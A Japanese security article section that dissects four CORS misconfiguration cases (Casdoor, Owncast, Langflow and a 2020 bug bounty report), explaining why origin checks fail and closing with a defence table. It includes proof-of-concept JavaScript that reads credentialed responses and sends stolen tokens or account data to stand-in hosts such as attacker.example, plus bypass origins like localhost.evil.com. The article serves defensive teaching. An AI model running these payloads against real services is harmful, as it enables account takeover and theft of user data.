## CORS関連CVE/advisoryと実戦記

CORS（Cross-Origin Resource Sharing）の設定ミスは、単体では「情報が読めてしまう」だけに見えて軽視されがちだが、認証済みセッションと組み合わさると**アカウント乗っ取り（ATO: Account Takeover）**、さらには**リモートコード実行（RCE）**にまで発展する。この節では、実際にCVE番号が付いた4件の事例（OSS製品3件＋バグバウンティ実戦記1件）を通して、「どういうコードがなぜ危険なのか」を仕組みレベルで解剖する。

前提として、CORSの悪用が成立する条件を最初に整理しておく。攻撃者ページ（`https://evil.com`）から被害者ブラウザ経由で標的APIに**認証情報（Cookie等）付きのクロスオリジン要求**を投げ、その**レスポンスを攻撃者JavaScriptが読み取れてしまう**には、標的のレスポンスに次の2つが同時に揃う必要がある。

1. `Access-Control-Allow-Origin`（以下 ACAO）が攻撃者オリジンを許可している
2. `Access-Control-Allow-Credentials`（以下 ACAC）が `true`

このとき、ブラウザの仕様上 ACAO に**ワイルドカード `*` は使えない**（`*` + credentials は禁止で、ブラウザがレスポンスをブロックする）。そのため攻撃者は「サーバがOriginを検証しきれず、攻撃者オリジンを**具体的な文字列として反射／許可**してしまう」設定ミスを狙う。以下の事例は、すべてこの「Origin検証の甘さ」が核心にある。

---

### 事例1: Casdoor — beego CorsFilter の「プレフィックス一致」バイパス（CVE-2024-41657 / GHSL-2024-035）

Casdoorは、SSO・OAuth・多要素認証などを提供するオープンソースのアイデンティティ基盤（IdP）である。IdPは全アプリのログイン状態を束ねる中枢であり、そこでCORSが破れると被害範囲は連結アプリ全体に及ぶ。

- 影響バージョン: **v1.577.0 以前**
- 修正バージョン: **v1.578.0**
- CVSS: **8.8（High）**（※GitHub Advisory等が採用。一部データベースはCVSS 3.1で8.1と記載）
- 発見: GitHub Security Lab、CodeQLの「CORS Misconfiguration Query」による検出

#### 何が起きたか — sink（危険な代入先）としてのORIGIN検証

問題は `routers/cors_filter.go` の `CorsFilter` にあった。許可オリジンの判定が、次のように**プレフィックス（前方）一致**と部分一致だけで行われていた。

```go
if strings.HasPrefix(origin, "http://localhost") ||
   strings.HasPrefix(origin, "https://localhost") ||
   strings.HasPrefix(origin, "http://127.0.0.1") ||
   strings.HasPrefix(origin, "http://casdoor-app") ||
   strings.Contains(origin, ".chromiumapp.org") {
    // このオリジンを信頼して ACAO に反射し、ACAC:true を付与する
}
```

ここで `origin` は攻撃者が自由に設定できる `Origin` リクエストヘッダの値である。開発者の意図は「localhost での開発や、ブラウザ拡張（`*.chromiumapp.org`）からのアクセスを許したい」というものだった。しかし `strings.HasPrefix(origin, "http://localhost")` は、文字列が `http://localhost` **で始まりさえすれば** true を返す。

#### なぜバイパスできるのか — URLの権威部（authority）の構造

原理を理解する鍵は、URLの `scheme://host` という構造にある。`http://localhost.example.com` というオリジンを考えると、これは**「`localhost.example.com` というホスト名」を持つ、攻撃者所有のドメイン**である（DNSで `localhost.example.com` を自分のサーバに向ければよい）。ところが文字列としては先頭が `http://localhost` なので、`HasPrefix` は true を返してしまう。

```text
Origin: http://localhost.evil.com   → HasPrefix(origin, "http://localhost") == true  ← 攻撃者ドメインなのに許可
Origin: http://127.0.0.1.evil.com   → HasPrefix(origin, "http://127.0.0.1") == true  ← 同上
```

`.chromiumapp.org` の `strings.Contains` も同様に危うい。`http://evil.com/#.chromiumapp.org` や `http://x.chromiumapp.org.evil.com` のような、`.chromiumapp.org` を**部分文字列として含むだけ**の攻撃者オリジンが通り抜ける。

このように、Origin検証を「文字列の前方一致・部分一致」で書くと、**ホスト名の右端（登録可能ドメインの境界）を無視する**ため、攻撃者は許可プレフィックスを自分のサブドメインラベルとして先頭に埋め込むだけでバイパスできる。GitHub Security Labの表現を借りれば「有効なプレフィックスを持つ有効なサブドメインは誰でも作れる（例: `localhost.example.com`）」。

#### 影響と修正

バイパスが成立すると、攻撃者ページはログイン中の被害者の資格情報付きでCasdoor APIを叩き、そのレスポンスを読めるため、ユーザー情報の窃取や設定改ざんによるアカウント乗っ取りに至る。修正版（v1.578.0）では、前方一致ではなく**許可リストとの厳密一致（完全一致 or 正規のサブドメイン境界チェック）**へ改められた。

同アドバイザリではもう1件、`QrCodePage.js` のWechatPayフロー由来の**反射型XSS（CVE-2024-41658 / GHSL-2024-036）**も報告されている。クエリ由来の `successUrl` を無検証で `Setting.goToLink(this.state.successUrl)` に渡していたもので、`javascript:` スキーム等の注入でアカウント乗っ取りに繋がりうる。CORSの話題からは外れるが、同じ「入力を検証せずにsinkへ流す」パターンである点を押さえておきたい。

> 出典: GHSL-2024-035_GHSL-2024-036: CORS misconfiguration and Reflected XSS in Casdoor — https://securitylab.github.com/advisories/GHSL-2024-035_GHSL-2024-036_casdoor/

---

### 事例2: Owncast — 管理APIでのOrigin反射＋ACAC:true（CVE-2024-29026）

Owncastは、自前ホスト型のライブ配信・チャットサーバである。ここでの問題は、**管理API（`/api/admin/*`）**でCORSが全開になっていたことだ。管理APIは最も守られるべき面であり、そこがCORSで露出した意味は大きい。

- 影響バージョン: **0.1.2 以前**
- 修正バージョン: **0.1.3**（修正コミット `9215d9ba0f29d62201d3feea9e77dcd274581624`、2023-12-18）
- CVSS: **8.2（High、CVSS 3.1）**（※一部データベースはCSRFとして分類し9.1と記載）

#### 何が起きたか — 「Origin丸ごと反射」という最悪パターン

`router/middleware/auth.go`（32行目付近）で、レスポンスヘッダが次のように組み立てられていた。

```go
w.Header().Set("Access-Control-Allow-Origin", r.Header.Get("Origin"))
w.Header().Set("Access-Control-Allow-Credentials", "true")
w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization")
```

1行目が致命的だ。`r.Header.Get("Origin")`（＝攻撃者が任意に設定できるOriginヘッダ）を**一切検証せずそのまま**ACAOに書き戻している。しかも2行目で ACAC:true が付く。前述の成立条件（ACAOが攻撃者オリジンを許可 ＋ ACAC:true）が、**どんなオリジンに対しても無条件に満たされてしまう**。

これは「Origin反射（Origin reflection）」と呼ばれる典型的アンチパターンで、`*` を避けつつ実質的に「全オリジン許可＋credentials可」を作り出す、最も危険なCORS設定ミスである。

#### PoC — 管理者パスワードを盗む

攻撃者は次のようなHTMLを被害管理者に踏ませるだけでよい。

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);   // 実際は attacker.com へ送信する
    }
}
xhr.open('GET', 'http://owncast.domain/api/admin/serverconfig', true);
xhr.withCredentials = true;   // ← 被害者のCookie/認証情報を同送させる肝
xhr.send(null);
```

`xhr.withCredentials = true` が肝である。これにより、Owncastへのリクエストに**被害管理者のセッションCookie（や保存済みBasic認証）が自動付与**される。サーバはそのセッションを正規と認め、`serverconfig`（管理サーバ設定）を返す。応答ヘッダにはOrigin反射されたACAO＋ACAC:trueが付いているため、**攻撃者オリジンのJavaScriptがレスポンス本文を読める**。`serverconfig` には管理者パスワード（ハッシュ or ストリームキー等の機微情報）が含まれ、これを盗めば完全な管理権限奪取（ATO）となる。

#### なぜ withCredentials とプリフライトを越えられるのか

`GET /api/admin/serverconfig` は「単純リクエスト（simple request）」に近く、カスタムヘッダを足さなければ**プリフライト（OPTIONS事前確認）を経ずに本要求が飛ぶ**か、飛んでもサーバが全許可を返すため通る。ブラウザは「レスポンスを読ませてよいか」をACAO/ACACで最終判定するが、その両方が攻撃者に有利に揃っているため、読み取りブロックが働かない。修正では**CORS許可をlocalhostのみに制限**し、任意オリジンの反射をやめた。

> 出典: GHSL-2023-261: CORS misconfiguration in Owncast — https://securitylab.github.com/advisories/GHSL-2023-261_Owncast/

---

### 事例3: Langflow — CORS全開×リフレッシュトークン×SameSite=None が RCE まで連鎖（CVE-2025-34291）

Langflowは、LLMエージェント／ワークフローを組むビジュアル基盤である。この事例は、CORS単体ではなく**「CORS設定ミス」「クロスサイト配送されるリフレッシュトークンCookie」「トークン更新エンドポイントのCSRF欠如」**が連鎖して、ワンクリックでのアカウント乗っ取り→RCEに至った点で示唆に富む。しかもCISA/VulnCheckのKEV（Known Exploited Vulnerabilities、実際に悪用が観測された脆弱性）に登録された、実害を伴う事例である。

> ⚠️ **未取得の資料**: 指定URLの「GitLab Advisory Database（Langflow CVE-2025-34291）」は自動取得できませんでした（理由: WebFetchが当該ページのJavaScript描画コンテンツを取得できず本文が空扱いとなったため）。以下のURLからご自身で直接ご覧ください: https://advisories.gitlab.com/pkg/pypi/langflow/CVE-2025-34291/
> 以下の技術内容は、同一CVEを扱う一次情報のVulnCheckアドバイザリおよびObsidian Security解説から抽出したものです（下記出典参照）。

- 影響バージョン: **1.6.9 以前**（デフォルト構成が脆弱）
- 修正バージョン: **1.7.0**
- CVSS: **9.4（Critical、CVSS v4.0）**／ベクタ `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`
- CWE: **CWE-346（Origin Validation Error）**
- KEV: **VulnCheck KEV に登録（実世界での悪用が観測）**

#### 連鎖の全体像

Langflowのデフォルト構成は、概念的には次のようなCORSミドルウェア（FastAPI/Starlette）を持っていた。

```python
# 危険な組み合わせ（概念コード）
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],      # 全オリジン許可
    allow_credentials=True,   # かつ credentials も許可
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`allow_origins=["*"]` と `allow_credentials=True` の同時指定は、仕様上は矛盾（`*`+credentialsはブラウザがブロック）だが、多くのフレームワークはこの指定を受けると**リクエストのOriginを反射する形で実質的に全許可**として振る舞う。結果、事例2と同じ「任意オリジン許可＋ACAC:true」の状態になる。

もう一方の要因が、リフレッシュトークンCookieの属性である。

```text
Set-Cookie: refresh_token_lf=<...>; HttpOnly; SameSite=None; Secure
```

`SameSite=None` は、そのCookieを**クロスサイト（第三者サイト起点）のリクエストにも自動付与する**設定である。攻撃者ページからLangflowのトークン更新エンドポイント（`/api/v1/refresh` 相当）へ `fetch(..., {credentials:'include'})` すると、被害者の `refresh_token` が同送され、サーバは**新鮮な access_token / refresh_token ペアを発行**する。CORSが実質全開なので、攻撃者JSはその応答（新トークン）を読み取れる。加えて更新エンドポイントにCSRF対策（トークン確認等）が無いため、この一連が成立する。

```javascript
// 概念PoC: 被害者がページを開くだけでトークンを奪取
fetch("https://victim-langflow.example/api/v1/refresh", {
  method: "POST",
  credentials: "include"   // SameSite=None の refresh_token が同送される
})
.then(r => r.json())
.then(tok => {
  // ACAO反射＋ACAC:true なのでレスポンス(=新トークン)が読める
  navigator.sendBeacon("https://attacker.example/steal", JSON.stringify(tok));
});
```

#### なぜ RCE まで行くのか

奪ったトークンで攻撃者は被害者として認証済みAPIを叩ける。Langflowには**コード実行機能（ワークフロー内でPython等を評価する組み込み機能）**があり、認証済みなら到達できる。したがって「CORS設定ミス → トークン窃取（ATO） → 認証済みコード実行エンドポイント → RCE → 完全なシステム侵害」という連鎖が完成する。さらにLangflow環境にはOpenAI/AnthropicのAPIキー、DB接続文字列、ベクタストア資格情報、Webhookシークレット等が保存されているのが常であり、二次被害（連携先サービスの資格情報流出）も甚大である。

この事例の教訓は明確だ。**CORSは認証・Cookie属性・CSRF対策と一体で設計しなければならない**。`allow_credentials=True` を使うなら `allow_origins` は厳密な許可リストにし、認証トークンCookieは可能な限り `SameSite=Lax`/`Strict` にし、状態変更・トークン更新エンドポイントにはCSRF対策を併設する——このどれか一つでも成立していれば、連鎖は途中で断ち切れた。

> 出典: Langflow <= 1.6.9 CORS Misconfiguration to Token Hijack & RCE (CVE-2025-34291) — VulnCheck — https://www.vulncheck.com/advisories/langflow-cors-misconfiguration-to-token-hijack-and-rce
> 出典: CVE-2025-34291 Critical Account Takeover and RCE in Langflow — Obsidian Security — https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform
> 出典: GitLab Advisory Database — Langflow CVE-2025-34291（未取得） — https://advisories.gitlab.com/pkg/pypi/langflow/CVE-2025-34291/

---

### 事例4: バグバウンティ実戦記 — CORSによるATO＋機密データ窃取（Lütfü Mert Ceylan, 2020）

最後は、CVE化されていない実サービスでのバグバウンティ事例。研究者 Lütfü Mert Ceylan 氏が2020年6月に報告し、報奨金を得たもの。CVEやOSSコードの外で、**現場でどう見つけ・どう再現し・報告したか**の一次記録として価値がある。

> ⚠️ **注記**: 本節は防御・検出手法の理解を目的とする。ここに書かれた手順は**あくまで研究者本人が正規の許可（バグバウンティ）の下で自身の検証環境／許諾範囲に対して行ったもの**であり、無許可の実在サービスや本番環境に対して同種の検証を行ってはならない。

#### 発見 — Originを差し替えて反射を観測する

CORS設定ミスの検出は極めて単純だ。任意のリクエストの `Origin` ヘッダを攻撃者オリジンに差し替え、レスポンスの ACAO/ACAC を観察する。

```http
GET /api/account HTTP/1.1
Host: target.example
Origin: https://evil.com
Cookie: session=<被害者相当のセッション>
```

に対し、サーバが次を返した。

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com      ← Originをそのまま反射
Access-Control-Allow-Credentials: true             ← credentials も許可
```

任意の `Origin`（`evil.com`）が ACAO に反射され、かつ ACAC:true が付く——事例2・3と同じ「Origin反射型」の全開設定である。この時点で「credentials付きクロスオリジン読み取りが可能」と確定する。

#### 悪用 — PUT一発でメール変更＋全データJSON窃取

このサービスでは、アカウント情報更新（メールアドレス変更）が `PUT` で行え、**そのレスポンスにアカウントの全データがJSONで返る**設計だった。研究者は、被害者にページを踏ませるだけで動くスクリプトを作成した（概念再構成）。

```javascript
var req = new XMLHttpRequest();
req.open("PUT", "https://target.example/api/account", true);
req.withCredentials = true;                         // 被害者のセッションを同送
req.setRequestHeader("Content-Type", "application/json");
req.onload = function () {
    // ACAO反射＋ACAC:true のため、応答(=全アカウントデータ)を読める
    navigator.sendBeacon("https://attacker-requestbin.example/collect", req.responseText);
};
// メールを攻撃者のものに書き換える → 以後パスワードリセットで完全奪取
req.send(JSON.stringify({ email: "attacker@evil.com" }));
```

このスクリプトは2つの攻撃を同時に成立させる。

1. **アカウント乗っ取り（ATO）**: `email` を攻撃者アドレスに書き換える。以後、攻撃者は「パスワードを忘れた」フローで自分のメールにリセットリンクを受け取り、被害者アカウントを完全掌握する。
2. **機密データ窃取**: 同じPUTのレスポンスに返る全アカウントデータJSONを、ACAO/ACACが揃っているため攻撃者JSが読み取り、requestbin等の攻撃者管理エンドポイントへ送信する。

#### なぜ PUT が通ってしまうのか — プリフライトの誤解

`PUT` かつ `Content-Type: application/json` は「単純リクエスト」ではないため、ブラウザは事前に `OPTIONS`（プリフライト）を送り、サーバの `Access-Control-Allow-Methods`／`Access-Control-Allow-Headers`／ACAO／ACAC を確認する。ここで「プリフライトがあるから安全」と考えるのは誤りだ。**サーバがプリフライトにも全許可（任意Origin反射＋ACAC:true＋PUT許可＋Content-Type許可）を返せば、ブラウザは本要求を送出し、レスポンス読み取りも許す**。CORSはあくまで「サーバが許可したか」を仲介するだけで、サーバ側の許可が甘ければ何の防壁にもならない。

- タイムライン: 2020-06-10 報告・確認、2020-06-11 報奨金授与

> 出典: ATO and Data Leakage via CORS Misconfiguration — Lütfü Mert Ceylan — https://lutfumertceylan.com.tr/posts/ato-and-data-leakage-via-cors-misc/

---

### この節のまとめ — 4事例から抽出できる防御原則

4件に共通する根本原因は、**「Originを厳密な許可リストと完全一致で照合していない」**ことに尽きる。危険パターンと対策を対比して締めくくる。

| 危険パターン | 具体例（本節） | 防御 |
| --- | --- | --- |
| プレフィックス／部分文字列一致でOrigin検証 | Casdoor `HasPrefix`／`Contains` | 完全一致の許可リスト。サブドメイン許可はホスト境界（右端ラベル）を厳密に確認 |
| Originヘッダを無検証で反射 | Owncast、実戦記 | 反射しない。許可リストに含まれるときだけ、その正規化済み値を返す |
| `allow_origins=*` と `allow_credentials=true` の併用 | Langflow | credentials可なら `*` は使わない。許可オリジンを明示列挙 |
| CORSを認証・Cookie・CSRFと切り離して設計 | Langflow連鎖 | 認証トークンCookieは `SameSite=Lax/Strict`、状態変更・トークン更新にCSRF対策 |
| 管理API・トークン更新など高権限面をCORSで露出 | Owncast `/api/admin/*`、Langflow `/refresh` | 高権限エンドポイントは同一オリジン限定（CORS許可を出さない） |

CORSの設定ミスは「読めるだけ」では終わらない。認証済みセッション、状態変更API、クロスサイト配送されるCookie、CSRF欠如が揃えば、**情報漏洩→アカウント乗っ取り→コード実行**へと一直線に連鎖する。CORSは単独の機能ではなく、認証・セッション・CSRF対策と一体の**信頼境界（trust boundary）の設計問題**として扱うべきである。
